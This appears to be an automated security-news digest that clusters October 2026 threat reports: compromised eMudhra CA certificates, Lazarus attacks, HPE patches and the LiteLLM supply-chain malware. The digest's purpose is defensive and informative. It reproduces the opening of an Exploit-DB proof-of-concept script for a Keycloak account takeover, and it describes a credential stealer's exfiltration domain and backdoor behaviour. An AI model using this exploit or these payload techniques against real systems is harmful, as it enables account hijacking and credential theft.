  - Summary: Noteworthy stories that might have slipped under the radar: Russia’s APT28 hit NATO defense firms, PingCAP source code stolen, ShinyHunters negotiator probe. The post In Other News: Tor Exit Relays Hijacked, Banks Spot Rogue AI Agents, Self-Rebuilding macOS Ransomware appeared first on SecurityWeek .
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
  - Published: 2026-10-21T14:59:35+00:00
  - Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - Summary: Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration.
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Hacker hijacks 10% of Tor exit nodes
  - Published: 2026-10-21T04:19:44+00:00
  - Link: https://risky.biz/RBNEWS623/
  - Summary: A hacker hijacks more than 10% of Tor’s exit nodes, a second ransomware negotiator has been linked to ShinyHunters, a Chinese crime ring hacked Staples, and a hacker leaks emails from German far-right party AfD.

### Cluster 50fbf176f4 — score 14

- Title: EMudhra Intermediate CA Certificates Compromised
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-22T17:15:32+00:00
- Link: https://unit42.paloaltonetworks.com/emudhra-certificate-compromise/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_products: Palo Alto Networks
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_products: Palo Alto Networks
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Eight compromised eMudhra intermediate CA private keys risk unauthorized TLS signing and MitM interception. Read our analysis and containment guide. The post EMudhra Intermediate CA Certificates Compromised appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center High Profile Threats Malware Malware EMudhra Intermediate CA Certificates Compromised 3 min read Related Products Next-Generation Firewall Unit 42 Deep and Dark Web Service Unit 42 Incident Response Unit 42 Threat Intelligence Services By: Unit 42 Published: October 22, 2026 Categories: High Profile Threats Malware Tags: Certificates Compromise Cryptographic MitM PKI TLS Share Executive Summary Eight intermediate certificate authority (CA) private keys belonging to Indian CA eMudhra Limited were compromised due to a critical cryptographic defect during the certificate generation process. The private keys in this incident were generated with insufficient randomness, allowing potential attackers to derive the private keys from the public certificates. The weakness in cryptography allows third parties to: Derive the private keys Sign unauthorized public TLS certificates Execute meddler-in-the-middle (MitM) traffic interception, impersonation or session hijacking against targeted domains Major browser and operating system (OS) vendors have moved to revoke or untrust these intermediate CAs. eMudhra has revoked the eight certificates. Palo Alto Networks is designed to assist customers with managing certificate lifecycles through its Palo Alto Networks Next-Gen Trust Security solution. This solution is designed to provide customers with the capabilities needed to react to situations like the eMudhra incident. Palo Alto Networks also recommends the following activities, which we describe in more detail in the Interim Guidance section: Audit public and internal public key infrastructure (PKI) assets Inspect code repositories and build pipelines Audit internal systems and custom trust stores Immediate certificate reissuance Force emergency trust store updates Enforce strict revocation checking Query network egress and proxy logs Audit network telemetry for MitM activity Review authentication and identity logs Implement Certificate Transparency (CT) monitoring Enforce Certificate Authority Authorization (CAA) records Harden automated certificate lifecycle management (ACME/CLM) Organizations can access tailored adversary intelligence, direct analyst consultations, and specialized exposure tracking through Unit 42 Threat Intel Services and its Deep and Dark Web Service . The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk. Interim Guidance Palo Alto Networks recommends the following actions to address this issue: Discovery and internal exposure assessment Audit public and internal PKI assets : Inventory all public-facing services, web applications, API endpoints, VPN gateways and internal infrastructure. Identify any active TLS/SSL certificates chaining up to eMudhra intermediate CAs. Inspect code repositories and build pipelines: Audit software projects, containers and deployment scripts to ensure intermediate eMudhra certificates or hard-coded trust anchors were not bundled into applications, API clients or custom runtime environments. Audit internal systems and custom trust stores: Search for eMudhra roots or intermediates stored within custom enterprise trust stores (e.g., Linux /etc/ssl/certs, Java keystores, Python certifi bundles, Docker base images and mobile application bundles). Technical containment and certificate revocation Immediate certificate reissuance: If any system uses a certificate issued under the compromised eMudhra intermediate CAs, immediately revoke and re-issue the certificate through an alternative, fully trusted CA. Force emergency trust store updates: Deploy updated root and intermediate certificate trust stores via mobile device management (MDM) across all endpoints, servers and container images to explicitly distrust or revoke the affected eMudhra intermediates. Enforce strict revocation checking: Configure enterprise web proxies, API gateways, outbound egress controls and security appliances to strict
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: EMudhra Intermediate CA Certificates Compromised
  - Published: 2026-10-22T17:15:32+00:00
  - Link: https://unit42.paloaltonetworks.com/emudhra-certificate-compromise/
  - Summary: Eight compromised eMudhra intermediate CA private keys risk unauthorized TLS signing and MitM interception. Read our analysis and containment guide. The post EMudhra Intermediate CA Certificates Compromised appeared first on Unit 42 .

### Cluster 27d2105c1c — score 14

- Title: Operation FlashHole: Lazarus breaks security, defies control
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-10-21T02:07:29+00:00
- Link: https://securelist.com/lazarus-operation-flashhole/121541/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Lazarus

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- actor_attribution: Lazarus
- affected_industries: financial_services, government, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- actor_attribution: Lazarus
- affected_industries: financial_services, government, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky researchers analyze Operation FlashHole – a recent complex attack by Lazarus, involving a sophisticated malware set, watering-hole technique and abuse of CrossWeb EX financial security software.
```

#### Full body

```
Table of Contents Background Initial infection vector Full infection chain Malware set TechHub – the start of the chain Cubridge – the framework orchestrator TouchHub installs a service for TouchShift TouchShift, a prevalent loader employed across multiple infection chains ClientHub LPEClient Comparison of plugins and modules Infrastructure Victims Attribution and links to other campaigns Conclusion Indicators of compromise File hashes File paths C2 servers Authors Sojun Ryu In January, we responded to the Lazarus Group’s novel attack campaign against South Korea, which followed last year’s Operation SyncHole . In this new operation, the group employed an updated malware chain that included both their old and new malware, which we disclosed in full, and used another mandatory South Korean security software program as a part of infection chain using a watering‑hole strategy. Notably, the group targeted victims more selectively, sending spear‑phishing emails with links to fabricated but relevant sites, such as portfolio and résumé pages tailored to each target. We dubbed this activity Operation FlashHole. Operation FlashHole attack flow during initial compromise Our examination reveals that the earliest evidence of this new operation dates back to July 2025. This suggests the group began preparing for the campaign shortly after ending Operation SyncHole, which lasted at least four months. We identified a minimum of three organizations impacted by the campaign in South Korea’s software, construction, and wired communication equipment manufacturing sectors. These sectors differ from those affected by Operation SyncHole, indicating that the group has expanded its target scope over time. Background After more than a year since the first observation of Operation SyncHole, we detected a suspicious execution chain originating from legitimate South Korean software. This chain mirrors the one from the previous operation; however, this time, the attacker abused CrossWeb EX instead of Cross EX, which was abused in Operation SyncHole. Both applications appear to be maintained by the same vendor, and both are related to financial security. CrossWeb EX is a financial security solution that is required to access widely used online banking and government websites. It encrypts communications between the user’s browser and the web server using public key infrastructure (PKI). This is not the first time Lazarus has abused this software. It was also used in 2021 to deploy the Racket downloader and again in 2022 and 2023 . Although the exact method by which CrossWeb EX was abused remains unclear, we determined that the attack chain ultimately leads to the execution of the malware in memory. We noted that the spawned process was running with a high integrity level. The parent process, INISAFECrossWebEXSvc.exe , originates from the installation bundle of INISAFE CrossWeb EX V3 version 3.4.1.2, released in 2023 after KrCERT’s public advisory . As we already mentioned in our SyncHole blog post, this pattern closely mirrors the long‑standing strategy employed by the Lazarus Group to target South Korea. Since CrossWeb EX and similar software is mandatory for South Korean users and typically runs in the background to interact with the browser, it has been leveraged as a critical attack vector by the group. In 2025, a paper was presented at the USENIX Security Symposium that investigated vulnerabilities in South Korea’s mandatory security software and demonstrated how such software can unintentionally create a massive attack surface. In July 2026, the South Korean government and several local security vendors also published a joint security advisory covering typical Lazarus attack techniques, including exploitation of financial security software. While this advisory overlaps with our findings from Operation FlashHole and Operation SyncHole, and AhnLab’s detailed analysis report Operation Double Barrel covers a wide range of recent Lazarus Group activities,
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Operation FlashHole: Lazarus breaks security, defies control
  - Published: 2026-10-21T02:07:29+00:00
  - Link: https://securelist.com/lazarus-operation-flashhole/121541/
  - Summary: Kaspersky researchers analyze Operation FlashHole – a recent complex attack by Lazarus, involving a sophisticated malware set, watering-hole technique and abuse of CrossWeb EX financial security software.

### Cluster a9f0cb00a4 — score 14

- Title: Compromised eMudhra intermediate certificates
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-21T20:43:29+00:00
- Link: https://blog.talosintelligence.com/compromised-intermediate-certificates/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: Cisco

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- affected_products: Cisco, Kubernetes
- cve_ids: CVE-2026-111943
- content_type: incident_report, news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services
- affected_products: Cisco, Kubernetes
- cve_ids: CVE-2026-111943
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cisco Talos is aware of eight intermediate certificates belonging to the intermediate certificate authority, eMudhra.
```

#### Full body

```
Compromised eMudhra intermediate certificates By Cisco Talos Wednesday, October 21, 2026 16:43 Threat Advisory Cisco Talos is aware of eight compromised intermediate certificates belonging to the intermediate certificate authority, eMudhra . Rather than possessing the mandatory 384 bits of pseudo-random security, several private keys evaluated single-digit and double-digit integers. This misconfiguration allows an attacker with the private key of any of the compromised intermediate CAs to impersonate any website or service. Six of the TLS certificates, trusted by Chrome, Mozilla, and Apple have been blocked by these vendors already. Two other certificates, used for codesigning by Microsoft, have also been blocked. Talos expects there will be additional patches available across a variety of technologies as software applications work to remediate the certificates’ exposure. Following the disclosure, eMudhra has revoked the compromised certificates and stopped issuing new certificates under its G3 root. Compromise details The cause of this issue, originated during an April 30, 2025 key generation activity conducted by eMudhra under its emSign Root TLS CA - G3 and cross-signed Comodo AAA Certificate Services. During a key generation ceremony for 24 subordinate CAs, a flaw in eMudhra’s key generation process created a second set of weak P-384 keys during a wrap/unwrap step. Those keys were mistakenly used for eight intermediate CA certificates. This flaw took the encryption from 384 bytes of entropy down to 3 – 8, making recovering the private keys trivial. The following are the impacted certificates, as illustrated in Mozilla’s bug report : EM EV TLS CA - G3B (eMudhra BV), CCADB A012304 SHA-256 E7568FE6E12331F4FD7DE61DA4C7559D0F8EB192A218D4741A3BA75184333838 serial c7c41efe92d825f05eae841a4a82c1, issuer emSign Root TLS CA - G3 EM OV TLS CA - G3B (eMudhra BV), CCADB A012308 SHA-256 98B896625C0C230ADEEC3EB2CF6AAD5001ECF9156A68644E82374CE5833BC25B serial 6cada367fb1c100088120ea202d568, issuer emSign Root TLS CA - G3 EM DV TLS CA - G3B (eMudhra BV), CCADB A012302 SHA-256 42C4ACCD12C4F59597925E1A08A7A90102608543809308D50EC427E118BA1493 serial a4aee678f23362b4c0e460b772f214, issuer emSign Root TLS CA - G3 EM EV TLS CA - G3C (eMudhra Inc), CCADB A012296 SHA-256 432EC25F0D28DE9006D97BF752F17BBB2CD41F669933FCB072D9A1148D0261F3 serial 8009928a64107601af05fa2f19f109, issuer emSign Root TLS CA - G3 EM OV TLS CA - G3C (eMudhra Inc), CCADB A012300 SHA-256 CB6E15165AC802E9B3F993F16C25D41F4E81C21EBDE71AE1B012AC00BF9C7C3F serial 296926c227a3a1526392b19482a504, issuer emSign Root TLS CA - G3 EM DV TLS CA - G3C (eMudhra Inc), CCADB A012294 SHA-256 0164D7CEAE5BB909C272AF151FF44B1177AE9B47D9424B94F1D9558C30934D19 serial 588b2e3c2bb8cda13e1a1209254321, issuer emSign Root TLS CA - G3 EM OV CS CA - G3B (eMudhra BV), CCADB A012306 SHA-256 9E39DE2881273ACC225A149C72BA3E0F51424963669AB633EE1DC7DF5DB067B4 serial 7818933f8f85b4619a2b35fba83d0a, issuer emSign Root CS CA - G3 EM OV CS CA - G3C (eMudhra Inc), CCADB A012298 SHA-256 4B2460A466F95FD40113BCDCCA2CEB29B3B093921DE45474DA7DF48874C630B1 serial 544b7f922c31ae220a4a922916f6e6, issuer emSign Root CS CA - G3 CVE-2026-111943 Unlike languages that defer entirely to external dynamic system libraries (like OpenSSL), the Go programming runtime implements its own X.509 chain verification engine in the standard library (crypto/x509). While Go usually queries platform certificates, several platforms or static container environments rely on embedded or legacy root certificate pools where certificate revocations are ignored. To eliminate exploitation across the entire cloud-native ecosystem including Docker, Kubernetes, Terraform, and Prometheus, the Go team designated the compromised certificates as a vulnerability, CVE-2026-111943, and released Go versions 1.27.3 and 1.26.10. The fixed versions filter out chains containingthe SHA-256 hashes of the SubjectPublicKeyInfo (SPKI) for all eight compromised eMudhra interme
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Compromised eMudhra intermediate certificates
  - Published: 2026-10-21T20:43:29+00:00
  - Link: https://blog.talosintelligence.com/compromised-intermediate-certificates/
  - Summary: Cisco Talos is aware of eight intermediate certificates belonging to the intermediate certificate authority, eMudhra.

### Cluster 9bafbd4346 — score 14

- Title: There's only so much code: the rise in vulnerability numbers
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-20T15:31:22+00:00
- Link: https://blog.talosintelligence.com/theres-only-so-much-code-the-rise-in-vulnerability-numbers/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2021-44228
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2021-44228
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
The September Microsoft Patch Tuesday release included 975 vulnerability advisories. This month, 1,415 vulnerabilities were just dropped. Compared to a pre-June average of 100 a month, that increase is staggering. Where did they come from? And what does the future look like?
```

#### Full body

```
There's only so much code: the rise in vulnerability numbers By Kri Dontje , Yves Younan Tuesday, October 20, 2026 11:31 On The Radar Frontier AI models (like Mythos) are rapidly mining decades of technical debt across ubiquitous legacy libraries, driving monthly Microsoft Patch Tuesday vulnerability advisories up more than tenfold (reaching 1,415 this month). This volume is overwhelming open-source maintainers and putting pressure on the traditional 90-day coordinated disclosure model. Despite a 105% year-over-year surge in CVEs, Known Exploited Vulnerabilities (KEVs) grew by only 37%, and only 3 of September's 975 Microsoft advisories saw in-the-wild exploitation, demonstrating that the vast majority of AI-discovered bugs are not practically exploited. We may be able to take new-bug-class vulnerability spikes as evidence that these vulnerabilities will eventually level off and decline, once the historical code backlog is remediated and AI verification is embedded directly into new development pipelines. With attackers able to parse patches faster via AI, defenders cannot cover for all possible threats. Organizations should continue to build robust defense-in-depth. Prioritize high-exploitability flaws in their specific environments, implement interim mitigations (such as LiveProtect), deploy behavioral anomaly detection, and integrate current AI evaluation models into their software build chains. The September Microsoft Tuesday release included 975 vulnerability advisories. This month, 1,415 vulnerabilities were just dropped. Compared to a pre-June average of 100 a month, that increase is staggering. Where did they come from? As of April, frontier models came onto the scene more fine-tuned than ever toward vulnerability detection, particularly with the introduction of Mythos. The deluge brings a lot of questions: If these numbers are real, why hasn’t the internet collapsed? Are these vulnerabilities a new breed, and if not, why didn’t analysts find them in code that is sometimes decades old? Is the coordinated disclosure model still relevant in an era of this kind of speed? How in the world do defenders deal with those numbers? Should we go home, kiss our spouses, and prepare for the end? The answer to many of these questions boils down to this: The majority of these vulnerabilities are coming from repositories of old code from large-profile products and systems; and disclosure does not equal weaponization. Where is it from? AI is chewing through a backlog of technical debt in libraries and tools used as the dependable, best-practice lynchpins of so many environments. These models have a new perspective, an ability to "think" without some of the hangups or assumptions of human defenders, and they are thorough in listing those vulnerabilities. Entrenched older tools have always been prime targets because of their predictability; attackers know those tools and all their secrets, and they know what is likely to be present in a network with them. Multi-exploit attacks can be deployed with little variability. Pre-Mythos threat actors exploited log4j ( CVE-2021-44228 ) to immense success. The library was ubiquitous, included in nearly every environment, but not a component that got cataloged in visibility scans. A combination of scale and low visibility meant defenders were blindsided, scrambling to find out if they even used the log4j library before starting to concoct a mitigation plan. Talos has ongoing relationships with some of the largest technical vendors (such as the Microsoft Active Protections Process ( MAPP ) agreement). Organizations share additional information—detection guidance or maybe a POC — for vulnerabilities that are most likely to be exploited, to enable Talos to provide adequate coverage when the advisories are announced. "Microsoft believes it is important for us to provide detection content, based on their guidance," as Yves Younan, Director of Talos Vulnerability Discovery, Detection, and Testing, says. T
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: There's only so much code: the rise in vulnerability numbers
  - Published: 2026-10-20T15:31:22+00:00
  - Link: https://blog.talosintelligence.com/theres-only-so-much-code-the-rise-in-vulnerability-numbers/
  - Summary: The September Microsoft Patch Tuesday release included 975 vulnerability advisories. This month, 1,415 vulnerabilities were just dropped. Compared to a pre-June average of 100 a month, that increase is staggering. Where did they come from? And what does the future look like?

### Cluster 3eb9b72a05 — score 14

- Title: [webapps] Keycloak 26.7.2 - Unauthenticated Account Takeover
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-10-21T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52699
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-18963
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- cve_ids: CVE-2026-18963
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Keycloak 26.7.2 - Unauthenticated Account Takeover
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Keycloak 26.7.2 - Unauthenticated Account Takeover EDB-ID: 52699 CVE: 2026-18963 EDB Verified: Author: Abel Maldonado Type: webapps Exploit: / Platform: Multiple Date: 2026-10-21 Vulnerable App: # Exploit Title: Keycloak 26.7.2 - Unauthenticated Account Takeover # Date: 2026-10-15 # Exploit Author: Abel Maldonado | Orevim # Vendor Homepage: https://www.keycloak.org/ # Software Link: https://github.com/keycloak/keycloak/releases/tag/26.6.2 # Version: 26.0.0 - 26.4.14, 26.5.0 - 26.6.5, 26.7.0 - 26.7.1 # Tested on: Keycloak 26.6.2 (Docker, quay.io/keycloak/keycloak:26.6.2) # CVE: CVE-2026-18963 # Advisory: https://github.com/keycloak/keycloak/security/advisories/GHSA-4gv3-mc9p-5wqc # CWE: CWE-640 (Weak Password Recovery Mechanism for Forgotten Password) # Type: webapps # Platform: multiple # Repo: https://github.com/orevim/CVE-2026-18963-PoC # Research: https://orevim.co/research#cve-2026-18963 """Proof of concept and vulnerability check for CVE-2026-18963. CVE-2026-18963 is a reset-credentials flow bypass in Keycloak. An unscoped AUTHENTICATION_SELECTOR_SCREEN_DISPLAYED note lets an unauthenticated caller re-render the authenticator selection screen bound to the email execution. On an affected build that execution's action handler sets emailVerified and calls success() without checking the action token, so the flow reaches the update-password required action with no emailed link. Affected: >= 26.0.0 < 26.4.15, >= 26.5.0 < 26.6.6, >= 26.7.0 < 26.7.2. Patched in 26.4.15, 26.6.6 and 26.7.2; the 26.8.0 line ships with the fix. Three modes: --check decide whether the instance is affected, using a random identifier that resolves to nothing. Sends no mail and changes no account. --check --users ... additionally report which identifiers resolve. On an affected build a resolving identifier has emailVerified set as a side effect. --set-password complete the takeover. This locks the account holder out. Endpoints come from the realm's OIDC discovery document and form fields come from the forms themselves, so custom themes, custom paths and custom field names work without edits. Everything else is an option. Playwright is imported only when --open is used. """ from __future__ import annotations import argparse import base64 import dataclasses import enum import hashlib import http.client import http.cookiejar import html import json import os import random import re import secrets import socket import ssl import sys import time import urllib.error import urllib.parse import urllib.request from dataclasses import dataclass, field from html.parser import HTMLParser from pathlib import Path os.umask(0o077) # captures hold request and response material; keep them owner-only # Protocol defaults. Every one of these can be replaced from the command line. DISCOVERY_SUFFIX = ".well-known/openid-configuration" RESET_PATH_MARKER = "login-actions/reset-credentials" SELECTOR_FIELD = "tryAnotherWay=on" USERNAME_FIELD = "username" PASSWORD_FIELDS = ("password-new", "password-confirm") HTML_ACCEPT = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" class Outcome(enum.Enum): NOT_VULNERABLE = "not-vulnerable" ACCOUNT_ABSENT = "account-absent" FORM_REACHED = "form-reached" PASSWORD_SET = "password-set" RATE_LIMITED = "rate-limited" INCONCLUSIVE = "inconclusive" @dataclass class Target: url: str | None = None realm: str | None = None discovery_url: str | None = None auth_url: str | None = None reset_url: str | None = None client_id: str | None = None redirect_uri: str | None = None scope: str = "openid" selector_field: str = SELECTOR_FIELD username_field: str = USERNAME_FIELD password_fields: tuple[str, ...] = PASSWORD_FIELDS address: str | None = None verify_tls: bool = True timeout: float = 30.0 user_agent: str | None = None headers: dict[str, str] = field(default_factory=dict) def __post_init__(self) -> None: if self.url: self.url = sel
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] Keycloak 26.7.2 - Unauthenticated Account Takeover
  - Published: 2026-10-21T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52699
  - Summary: Keycloak 26.7.2 - Unauthenticated Account Takeover

### Cluster 1d63c3b8c3 — score 14

- Title: LiteLLM supply chain compromise: What you need to know
- Source: Datadog Security Labs (cloud_identity_infrastructure)
- Published: 2026-10-21T00:00:00+00:00
- Link: https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-docker/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: PyPI

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, supply_chain, web_shell_backdoor
- actor_attribution: TeamPCP
- affected_products: AWS, Docker, GitHub, PyPI, Salesforce
- urgency_signals: actively_exploited
- content_type: incident_report, news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, credential_theft, web_shell_backdoor, active_exploitation
- actor_attribution: TeamPCP
- affected_products: GitHub, PyPI, AWS
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Malicious releases of LiteLLM v1.107.0 were published to PyPI and container registries following multiple maintainer account compromises.
```

#### Full body

```
Ian Kretz Senior Security Researcher On October 21, 2026, attackers published a malicious release of litellm , a popular Python proxy library for LLM providers with about 23 million weekly downloads. The malicious release, version 1.107.0, was available on PyPI and in LiteLLM's official Docker images for approximately two hours before being removed. It installed a credential stealer that runs whenever Python starts and also contained a second-stage remote access trojan (RAT) backdoor. The infostealer payload targets cloud, developer, AI-tool, browser and LiteLLM proxy credentials. This marks the second supply chain compromise of LiteLLM in 2026, with the earlier incident (affecting versions 1.82.7 and 1.82.8) being linked to TeamPCP activity by Datadog Security Research. No connection between the two compromises has been established at time of writing. Package name Platform Affected releases litellm PyPI 1.107.0 litellm GHCR, Docker Hub Tags v1.107.0 , latest , main-latest , main-stable What happened According to LiteLLMâs analysis of the incident, attackers used stolen GitHub CLI OAuth tokens from three engineers' accounts to launch LiteLLMâs private release workflow. At time of writing, it was not yet clear how the affected credentials were initially compromised. The three stolen credentials were used to launch, approve and subsequently delete evidence of an unauthorized run of the legitimate build pipeline against a malicious fork, Berri-AI/litellm , whose name differs from the legitimate BerriAI/litellm fork by one hyphen. The similarity of the malicious forkâs name to the real project seems intended to evade casual detection by a human reviewer. The resulting wheels and images were published through LiteLLM's normal release channels and with seemingly legitimate build provenance that faithfully recorded the malicious fork as the source. Timeline Time (UTC) Event 11:39 Malicious release 1.107.0 published to PyPI 13:20 PyPI quarantines affected version 1.107.0 13:53 Affected Docker images removed Payload analysis The release adds three files to the victim Python installationâs site-packages directory: cook.pth cook.py sitecustomize.py Python runs .pth files and sitecustomize.py automatically every time the interpreter starts. Any Python process in the environment runs the malware, even if LiteLLM is never imported . Credential stealer ( cook.py ): Collects secrets and sends them, encrypted with AES-256 and RSA-4096, to the lookalike domain www.litellm[.]dev/healthcheck . Backdoor ( sitecustomize.py ): Every hour, checks a certain file hosted on a fixed GitHub repository ( letters9813/pythonclient-test/main/domain.txt , now removed) for a domain, then downloads and runs Python code from it. That file only ever held test values, so no second stage payload was observed in the wild. Deleting the litellm package directory does not remove these files. Running the environment's own python or pip triggers the malware again. Instead, the dropped payload files must be manually removed. Data exfiltration Cloud: AWS, GCP and Azure credentials, including from instance metadata; Kubernetes, Docker, Vault and Terraform secrets Developer: SSH, GPG and TLS keys, Git, npm and PyPI tokens, .env files, shell history AI: LLM provider API keys, and sessions for Claude, Codex, Gemini, Cursor, Copilot and other AI coding tools Browsers: saved passwords and cookies LiteLLM proxy: If a database is configured, it queries the tables where the proxy stores upstream provider credentials. What to do if you are affected Manually remove the malicious cook.pth , cook.py , and sitecustomize.py from the site-packages directory. Remove all code and data associated with the malicious litellm==1.107.0 release. Revert to litellm==1.106.2 , the latest safe version of the package. From a clean machine, immediately rotate all affected credentials. Audit relevant logs for use of exposed credentials during the exposure window. How Datadog can help Datadog Code
```

#### Corroborating sources (4)

- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: LiteLLM supply chain compromise: What you need to know
  - Published: 2026-10-21T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-docker/
  - Summary: Malicious releases of LiteLLM v1.107.0 were published to PyPI and container registries following multiple maintainer account compromises.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: LiteLLM Compromised in Supply Chain Attack Delivering Credential Stealer and Backdoor
  - Published: 2026-10-21T18:01:57+00:00
  - Link: https://thehackernews.com/2026/10/litellm-compromised-in-supply-chain.html
  - Summary: The popular LiteLLM Python package has been compromised as part of a software supply chain attack that delivered a credential stealer and a backdoor, according to reports from SafeDep, Socket, StepSecurity, and Upwind. The compromise affects LiteLLM 1.107.0, distributed through PyPI wheels and Docker images. The Python package has since been quarantined on Python Package Index (PyPI), and the
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: LiteLLM hit by second supply chain attack this year, users urged to rotate credentials
  - Published: 2026-10-22T13:10:28+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/22/litellm-compromised-supply-chain-attack-pypi-docker/
  - Summary: A malicious release of LiteLLM pushed to PyPI and Docker registries on Wednesday carried malware built to harvest cloud logins, developer secrets and API keys for AI services from anyone who installed it. “LiteLLM got compromised… again,” security researcher Kevin Beaumont wrote on Mastodon. In August, Hudson Rock analyzed a 153GB archive stolen during an earlier LiteLLM supply chain attack, in March, and linked it to 2,488 corporate domains, including AWS, Samsung, Cisco and Salesforce, … More → The post LiteLLM hit by second supply chain attack this year, users urged to rotate credentials appeared first on Help Net Security .
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: LiteLLM release pipeline hacked to distribute info-stealer malware
  - Published: 2026-10-22T19:12:51+00:00
  - Link: https://www.bleepingcomputer.com/news/security/litellm-release-pipeline-hacked-to-distribute-info-stealer-malware/
  - Summary: Hackers compromised the LiteLLM project's PyPI package and published malicious Docker images with a payload that steals credentials, secrets, and environment variables. [...]

### Cluster 119c62509b — score 13

- Title: HPE patches eight max severity RCE and auth bypass AOS flaws
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-23T12:48:00+00:00
- Link: https://www.bleepingcomputer.com/news/security/hpe-patches-eight-max-severity-rce-and-auth-bypass-aos-flaws/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: GitLab
- cve_ids: CVE-2026-79844, CVE-2026-79845, CVE-2026-79846, CVE-2026-79847, CVE-2026-79848
- urgency_signals: actively_exploited, no_patch_yet, poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: GitLab
- cve_ids: CVE-2026-79844, CVE-2026-79845, CVE-2026-79846, CVE-2026-79847, CVE-2026-79848
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Hewlett Packard Enterprise (HPE) released security updates to patch 72 vulnerabilities in the Aruba Operating System (ArubaOS), including eight maximum-severity authentication bypass and code execution issues. [...]
```

#### Full body

```
HPE patches eight max severity RCE and auth bypass AOS flaws By Sergiu Gatlan October 23, 2026 08:48 AM 0 Hewlett Packard Enterprise (HPE) released security updates to patch 72 vulnerabilities in the Aruba Operating System (ArubaOS), including eight maximum-severity authentication bypass and code execution issues. Also known as AOS, ArubaOS powers Aruba Networking enterprise wireless infrastructure, including mobility conductors, access points, controllers, and gateway devices. The eight maximum-severity security flaws patched today affect multiple AOS-8 and AOS-10 software versions, and they can be exploited by remote threat actors without privileges through low-complexity attacks that don't require user interaction. HPE warned customers to patch these security issues as soon as possible and provided mitigation measures, including restricting access to AOS management interfaces. "Customers are strongly urged to patch their instances due to the complexity, breadth, and impact of these vulnerabilities," the company warned in a Thursday security advisory. "To minimize the likelihood of an attacker exploiting these vulnerabilities, HPE Networking recommends that the CLI and web-based management interfaces be restricted to a dedicated layer 2 segment/VLAN and/or controlled by firewall policies at layer 3 and above along with accounting controls for tracking and logging user activities and resource usage." The full list of maximum severity flaws fixed today can be found in the table embedded below: CVE-ID Vulnerability CVE-2026-79844 Authentication Bypass Leading to RCE in AOS-10 CVE-2026-79845 Authentication Bypass in the PAPI 